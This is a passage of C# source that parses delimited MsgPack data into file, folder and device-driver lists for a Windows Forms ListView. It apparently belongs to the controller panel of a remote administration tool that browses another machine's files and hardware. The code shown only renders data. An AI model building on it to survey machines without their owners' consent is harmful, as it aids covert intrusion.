                    lv.ToolTipText = _folder[i + 1];
                    lv.Group = listViewGroup;
                    lv.ImageIndex = 0;
                    lists.Add(lv);
                    numFolders += 1;
                }
                i += 2;
            }
            return lists;
        }

        private static List<ListViewItem> GetFiles(MsgPack unpack_msgpack, ListViewGroup listViewGroup, ImageList imageList1, ImageList imageList2)
        {
            string[] _files = unpack_msgpack.ForcePathObject("File").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> lists = new List<ListViewItem>();
            for (int i = 0; i < _files.Length; i++)
            {
                if (_files[i].Length > 0)
                {
                    ListViewItem lv = new ListViewItem
                    {
                        Text = Path.GetFileName(_files[i]),
                        ToolTipText = _files[i + 1]
                    };
                    Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_files[i + 2])));

                    FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                    {
                        imageList1.Images.Add(_files[i + 1], im);
                        imageList2.Images.Add(_files[i + 1], im);
                    }));
                    lv.ImageKey = _files[i + 1];
                    lv.Group = listViewGroup;
                    lv.SubItems.Add(_files[i + 4]);
                    lv.SubItems.Add(_files[i + 5]);
                    lv.SubItems.Add(BytesToString(Convert.ToInt64(_files[i + 3])));
                    lists.Add(lv);
                }
                i += 5;
            }
            return lists;
        }

        public static void GetAllDevices(string DeviceInfoList, ListView listView)
        {
            List<DeviceInfo> list = new List<DeviceInfo>();
            string[] _NextDevice = DeviceInfoList.Split(new[] { "-=>" }, StringSplitOptions.None);
            for (int i = 0; i < _NextDevice.Length; i++)
            {
                if (_NextDevice[i].Length > 0)
                {
                    DeviceInfo deviceInfo = new DeviceInfo
                    {
                        Name = _NextDevice[i + 0],
                        DeviceId = _NextDevice[i + 1],
                        Description = _NextDevice[i + 2],
                        Manufacturer = _NextDevice[i + 3],
                        Category = (DeviceCategory)Enum.Parse(typeof(DeviceCategory), _NextDevice[i + 4]),
                        CustomCategory = _NextDevice[i + 5],
                        StatusCode = StatusCodeString(Convert.ToUInt32(_NextDevice[i + 6])),
                        HardwareId = _NextDevice[i + 7],
                        DriverName = _NextDevice[i + 8],
                        DriverBuildDate = _NextDevice[i + 9],
                        DriverDescription = _NextDevice[i + 10],
                        DriverVersion = _NextDevice[i + 11],
                        DriverProviderName = _NextDevice[i + 12],
                        DriverSigner = _NextDevice[i + 13],
                        DriverInfName = _NextDevice[i + 14],
                    };
                    list.Add(deviceInfo);
                }
                i += 14;
            }
            var newList = list.GroupBy(u => u.Category);
            foreach (var item in newList)
            {
                if (item.ToList()[0].Category.ToString() == "None")
                {
                    var newList2 = item.GroupBy(u => u.CustomCategory);
                    foreach (var item2 in newList2)
                    {
                        ListViewGroup group = new ListViewGroup(item2.ToList()[0].CustomCategory);
                        listView.Groups.Add(group);
                        foreach (var device in item2.ToList())
                        {
                            ListViewItem lv = new ListViewItem
                            {
                                Text = device.Name
                            };
                            lv.SubItems.Add(device.DeviceId);
                            lv.SubItems.Add(device.Description);
                            lv.SubItems.Add(device.Manufacturer);
                            lv.SubItems.Add(device.StatusCode);
                            lv.SubItems.Add(device.HardwareId);
                            lv.SubItems.Add(device.DriverName);
                            lv.SubItems.Add(device.DriverDescription);
                            lv.SubItems.Add(device.DriverVersion);
                            lv.SubItems.Add(device.DriverProviderName);
                            lv.SubItems.Add(device.DriverBuildDate);
                            lv.SubItems.Add(device.DriverSigner);
                            lv.SubItems.Add(device.DriverInfName);

                            lv.Group = group;
                            listView.Items.Add(lv);
                        }
                    }
                }
                else
                {
                    ListViewGroup group = new ListViewGroup(item.ToList()[0].Category.ToString());
                    listView.Groups.Add(group);
                    foreach (var device in item.ToList())
                    {
                        ListViewItem lv = new ListViewItem
                        {
                            Text = device.Name
                        };
                        lv.SubItems.Add(device.DeviceId);
                        lv.SubItems.Add(device.Description);
                        lv.SubItems.Add(device.Manufacturer);
                        lv.SubItems.Add(device.StatusCode);
                        lv.SubItems.Add(device.HardwareId);
                        lv.SubItems.Add(device.DriverName);
                        lv.SubItems.Add(device.DriverDescription);
                        lv.SubItems.Add(device.DriverVersion);
                        lv.SubItems.Add(device.DriverProviderName);
                        lv.SubItems.Add(device.DriverBuildDate);
                        lv.SubItems.Add(device.DriverSigner);
                        lv.SubItems.Add(device.DriverInfName);

                        lv.Group = group;
                        listView.Items.Add(lv);
                    }
                }
            }
        }
    }
}
